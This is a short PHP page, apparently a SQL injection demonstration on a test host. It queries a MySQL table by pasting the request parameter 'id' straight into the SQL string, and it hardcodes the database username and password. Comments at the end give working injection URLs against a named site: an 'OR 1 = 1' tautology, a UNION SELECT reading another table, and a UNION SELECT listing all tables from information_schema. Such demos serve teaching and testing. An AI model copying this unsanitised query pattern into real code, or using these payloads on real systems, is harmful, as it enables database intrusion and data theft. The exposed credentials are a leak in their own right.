<?php 

ini_set("display_errors", "0");

$mysqli = new mysqli("localhost", "ac_spri_messages", "d8Y94i_e", "ac_spri_messages");
$mysqli->set_charset("utf8");

$sql = "SELECT * FROM `ckodea_aux_comarcas_rurales` WHERE id = {$_REQUEST['id']} LIMIT 0, 1";
echo $sql;
$res = $mysqli->query($sql);
  if($res->num_rows > 0) {
    while ($row = $res->fetch_assoc()) {
    	echo "<pre>";
    	print_r($row);
    	echo "</pre>";
      echo "<h3>".$row['nombre']."</h3>";
   }
}

//http://pruebas.enuttisworking.com/vaccine.php?id=1

//http://pruebas.enuttisworking.com/vaccine.php?id=1%20OR%201%20=%201;%20--
//?id=1 OR 1 = 1; --

//http://pruebas.enuttisworking.com/vaccine.php?id=1%20UNION%20ALL%20SELECT%20id,%20nombre,%20provincia%20FROM%20ckodea_aux_municipios;%20--
//?id=1 UNION ALL SELECT id, nombre, provincia FROM ckodea_aux_municipios; --

//http://pruebas.enuttisworking.com/vaccine.php?id=1%20UNION%20ALL%20SELECT%201%20as%20id%20,%20table_name%20COLLATE%20utf8_general_ci%20as%20nombre,%201%20as%20provincia%20FROM%20information_schema.tables;%20--
//?id=1 UNION ALL SELECT 1 as id , table_name COLLATE utf8_general_ci as nombre, 1 as provincia FROM information_schema.tables; --
